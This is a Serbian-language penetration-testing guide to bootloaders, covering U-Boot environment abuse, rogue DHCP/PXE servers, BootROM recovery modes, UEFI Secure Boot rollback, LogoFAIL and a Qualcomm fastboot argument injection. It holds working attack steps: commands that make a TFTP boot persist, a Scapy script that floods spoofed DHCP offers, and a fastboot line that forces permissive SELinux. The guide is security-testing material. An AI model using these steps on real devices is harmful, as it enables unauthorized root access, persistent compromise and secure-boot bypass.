# Testiranje bootloadera

{{#include ../../banners/hacktricks-training.md}}

Preporučuju se sledeći koraci za izmenu konfiguracija pokretanja uređaja i testiranje bootloadera kao što su U-Boot i UEFI-class loaderi. Fokusirajte se na dobijanje izvršavanja koda u ranoj fazi, procenu zaštite potpisa/rollback-a i zloupotrebu recovery ili network-boot putanja.

Povezano: MediaTek secure-boot bypass putem patchovanja bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Brze pobede u U-Boot-u i zloupotreba environment-a

1. Pristupite interpreter shell-u
- Tokom boot-a pritisnite poznati break taster (često bilo koji taster, 0, razmak ili sekvencu specifičnu za ploču) pre nego što se izvrši `bootcmd`, kako biste prešli na U-Boot prompt.

2. Pregledajte stanje boot-a i promenljive
- Korisne komande:
- `printenv` (ispis environment-a)
- `bdinfo` (informacije o ploči, memorijske adrese)
- `help bootm; help booti; help bootz` (podržani načini boot-a kernela)
- `help ext4load; help fatload; help tftpboot` (dostupni loaderi)

3. Izmenite boot argumente da biste dobili root shell
- Dodajte `init=/bin/sh` kako bi kernel prešao na shell umesto uobičajenog init-a:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # IP uređaja
# setenv serverip 192.168.2.1    # IP TFTP servera
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Učinite izmene trajnim putem environment-a
- Ako storage za env nije zaštićen od upisa, možete trajno zadržati kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, koje utiču na fallback putanje. Pogrešno konfigurisane vrednosti mogu omogućiti ponovljene prekide i prelazak u shell.

6. Proverite debug/unsafe funkcije
- Potražite: `bootdelay` > 0, onemogućen `autoboot`, neograničen `usb start; fatload usb 0:1 ...`, mogućnost korišćenja `loady`/`loads` putem serijske veze, `env import` sa nepouzdanog medijuma i kernele/ramdisk-ove koji se učitavaju bez provere potpisa.

7. Testiranje U-Boot image-a/provere
- Ako platforma tvrdi da koristi secure/verified boot sa FIT image-ovima, pokušajte i sa unsigned i sa izmenjenim image-ovima:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy ponašanje `verify=n` često omogućava boot-ovanje proizvoljnih payload-a.
- Nemojte se zaustaviti na jednostavnom rezultatu allow/deny: novija FIT istraživanja pokazala su da sama putanja provere može biti pre-auth attack surface. Testirajte negativne slučajeve za eksterno skladištene FIT podatke (`data-offset`, `data-position`, `data-size`), izbor potpisane konfiguracije, `loadables` i obradu overlay / `extra-conf` opcija.
- Ako imate odgovarajuće source stablo, `test/vboot/vboot_test.sh` je brz način za reprodukciju FIT verification ponašanja u U-Boot sandbox-u pre rada sa stvarnim hardware-om.

8. Standard Boot (`bootstd`), `extlinux` i script bootflow-i
- U modernim U-Boot build-ovima, `bootcmd` je često samo wrapper oko Standard Boot-a. To znači da writable medijumi, PXE ili SPI flash mogu postati stvarna trust boundary čak i kada vidljivi environment izgleda bezopasno.
- `extlinux` bootmeth pretražuje `extlinux/extlinux.conf` u `/` i `/boot`; script bootmeth prvo pretražuje `boot.scr.uimg`, a zatim `boot.scr`. Kod network boot-a, ime script-a može poticati iz `boot_script_dhcp`.
- Korisne triage komande:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Slučajevi za testiranje: attacker-controlled USB/SD medijum koji je ranije u `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP koji isporučuje `boot.scr` ili izvršavanje script-a iz SPI-ja putem `script_offset_f`.
- Ako se platforma oslanja na FIT verification, proverite da li su konfiguracije potpisane na nivou konfiguracije, a ne samo po image-u; `required-mode=all` je jači od prihvatanja bilo kog pojedinačnog required ključa.

## Network-boot površina (DHCP/PXE) i rogue serveri

9. Fuzzing PXE/DHCP parametara
- U-Boot-ovo legacy BOOTP/DHCP rukovanje imalo je memory-safety probleme. Na primer, CVE‑2024‑42040 opisuje memory disclosure putem posebno izrađenih DHCP odgovora koji mogu da leak-uju bajtove iz U-Boot memorije nazad preko mreže. Testirajte DHCP/PXE putanje pomoću predugačkih/graničnih vrednosti (opcija 67 bootfile-name, vendor opcije, file/servername polja) i pratite hang-ove/leak-ove.
- Minimalni Scapy snippet za opterećivanje boot parametara tokom netboot-a:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li se PXE filename polja prosleđuju shell/loader logici bez sanitizacije kada se lančano povežu sa OS-side provisioning script-ama.

10. Testiranje command injection-a putem rogue DHCP servera
- Postavite rogue DHCP/PXE servis i pokušajte da ubacite karaktere u filename ili options polja kako biste u kasnijim fazama boot chain-a došli do command interpreter-a. Metasploit DHCP auxiliary, `dnsmasq` ili prilagođeni Scapy script-ovi dobro funkcionišu. Pre toga obavezno izolujte lab network.

## SoC ROM recovery režimi koji zaobilaze normalan boot

Mnogi SoC-ovi nude BootROM „loader“ režim koji prihvata code preko USB/UART-a čak i kada su flash image-ovi nevažeći. Ako secure-boot fuse-ovi nisu aktivirani, ovo može omogućiti arbitrary code execution veoma rano u chain-u.

- NXP i.MX (Serial Download Mode)
- Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
- Primer: `imx-usb-loader u-boot.imx` za slanje i pokretanje prilagođenog U-Boot-a iz RAM-a.
- Allwinner (FEL)
- Alat: `sunxi-fel`.
- Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Alat: `rkdeveloptool`.
- Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za učitavanje loader-a i upload prilagođenog U-Boot-a.

Procenite da li uređaj ima aktivirane secure-boot eFuse/OTP vrednosti. Ako nema, BootROM download režimi često zaobilaze sve provere višeg nivoa (U-Boot, kernel, rootfs) tako što direktno izvršavaju vaš first-stage payload iz SRAM/DRAM-a.

## UEFI/PC-class bootloaderi: brze provere

11. Testiranje ESP tampering-a, rollback-a i enrollment-a ključeva
- Mount-ujte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, putanje do vendor logo-a.
- Ispišite Secure Boot stanje i key database-e iz OS-a kada je moguće:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Ako je platforma u Setup Mode-u, prihvata neautentifikovani key enrollment ili se isporučuje sa test/default Platform Key-em (PKfail klasa), lokalni admin ili fizički attacker može da enroll-uje sopstveni KEK/db i zadrži Secure Boot koji izgleda „enabled“, dok boot-uje proizvoljne EFI binary-je.
- Pokušajte boot sa downgraded ili poznato ranjivim potpisanim boot komponentama ako Secure Boot revocations (dbx) nisu ažurne. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a radi persistence-a.

12. Testiranje zastarelog shim-a / SBAT-a / dbx revocation-a
- Stari Microsoft-signed shim-ovi i vendor fork-ovi i dalje mogu predstavljati BYOVD-style bootkit putanju ako su revocations zastarele. U izolovanom lab-u postavite istorijski ranjiv shim na ESP i pokušajte da chainload-ujete sopstveni `grubx64.efi` ili kernel.
- Brzi triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Ako shim i dalje radi uprkos tome što se nalazi na revocation listi, firmware/OS ima zastarele `dbx` update-e ili veruje fork-ovanom loader-u koji nikada nije nasledio upstream SBAT zaštite.

13. Bug-ovi u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmware-a bilo je ranjivo na propuste u parsiranju image-a u DXE-u, koji obrađuje boot logo-e. Ako attacker može da postavi posebno izrađen image na ESP pod vendor-specific putanjom (npr. `\EFI\<vendor>\logo\*.bmp`) i restartuje uređaj, code execution tokom ranog boot-a može biti moguć čak i kada je Secure Boot omogućen. Testirajte da li platforma prihvata user-supplied logo-e i da li su te putanje writable iz OS-a.


## Android/Qualcomm ABL + GBL (Android 16) trust gap-ovi

Na Android 16 uređajima koji koriste Qualcomm-ov ABL za učitavanje **Generic Bootloader Library (GBL)**, proverite da li ABL **autentifikuje** UEFI app koji učitava iz `efisp` particije. Ako ABL proverava samo **prisustvo** UEFI app-a i ne proverava potpise, write primitive ka `efisp` postaje **pre-OS unsigned code execution** tokom boot-a.

Praktične provere i abuse putanje:

- **efisp write primitive**: Potreban vam je način da upišete prilagođeni UEFI app u `efisp` (root/privileged service, OEM app bug, recovery/fastboot putanja). Bez toga, GBL loading gap nije direktno dostupan.
- **fastboot OEM argument injection** (ABL bug): Neki build-ovi prihvataju dodatne tokene u `fastboot oem set-gpu-preemption` i dodaju ih kernel cmdline-u. Ovo se može koristiti za forsiranje permissive SELinux-a, čime se omogućavaju upisi u zaštićene particije:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ako je uređaj patch-ovan, komanda treba da odbije dodatne argumente.
- **Bootloader unlock putem persistent flags**: Payload u boot fazi može promeniti persistent unlock flags (npr. `is_unlocked=1`, `is_unlocked_critical=1`) kako bi emulirao `fastboot oem unlock` bez OEM server/approval gate-ova. Ovo je trajna promena posture-a nakon sledećeg reboot-a.

Defensive/triage napomene:

- Potvrdite da li ABL vrši proveru potpisa GBL/UEFI payload-a iz `efisp`. Ako ne, tretirajte `efisp` kao high-risk persistence surface.
- Proverite da li su ABL fastboot OEM handler-i patch-ovani tako da **proveravaju broj argumenata** i odbijaju dodatne tokene.

## Oprez pri radu sa hardware-om

Budite oprezni pri radu sa SPI/NAND flash-om tokom ranog boot-a (npr. uzemljivanje pinova radi zaobilaženja čitanja) i uvek konsultujte datasheet za flash. Nepravovremeni kratki spojevi mogu oštetiti uređaj ili programmer.

## Napomene i dodatni saveti

- Pokušajte sa `env export -t ${loadaddr}` i `env import -t ${loadaddr}` da biste premeštali environment blob-ove između RAM-a i storage-a; neke platforme dozvoljavaju import env-a sa removable media bez autentifikacije.
- Za persistence na Linux-based sistemima koji se boot-uju putem `extlinux.conf`, izmena `APPEND` linije (radi ubacivanja `init=/bin/sh` ili `rd.break`) na boot particiji često je dovoljna kada nisu nametnute provere potpisa.
- Ako target koristi dual-slot / A/B update-e, pregledajte anti-rollback i slot-desync tehnike u [firmware analysis overview](README.md) kako ne biste propustili trust gap-ove koji postoje samo u updater-u, van samog bootloader-a.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da li `/etc/fw_env.config` odgovara stvarnom env storage-u. Pogrešno konfigurisani offset-i omogućavaju čitanje/upis u pogrešan MTD region.

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
